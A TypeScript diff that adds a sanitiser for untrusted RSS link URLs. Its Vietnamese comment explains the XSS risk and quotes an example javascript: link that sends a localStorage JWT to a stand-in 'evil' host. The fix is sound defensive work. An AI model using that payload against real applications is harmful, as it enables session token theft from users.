@@ -75,3 +75,24 @@ export function timeAgo(iso: string): string {
   const days = Math.floor(hours / 24)
   return `${days}d ago`
 }
+
+/**
+ * Lọc URL đến từ nguồn không tin cậy trước khi đưa vào thuộc tính href.
+ *
+ * VÌ SAO CẦN: `research_agent.py` lưu `entry.get("link", "")[:500]` nguyên xi từ
+ * feed RSS. React KHÔNG chặn `javascript:` trong href, nên một mục RSS có
+ * `link = "javascript:fetch('https://evil/?t='+localStorage.forecast_ai_token)"`
+ * sẽ hiển thị như một "Nguồn tham khảo" bình thường, và người dùng bấm vào là
+ * script chạy trong origin của ứng dụng — lấy được JWT đang nằm trong localStorage.
+ *
+ * Trả về "#" cho mọi thứ không phải http/https.
+ */
+export function safeExternalHref(raw: unknown): string {
+  if (typeof raw !== "string" || !raw) return "#"
+  try {
+    const url = new URL(raw, typeof window !== "undefined" ? window.location.origin : "https://localhost")
+    return url.protocol === "http:" || url.protocol === "https:" ? url.href : "#"
+  } catch {
+    return "#"
+  }
+}
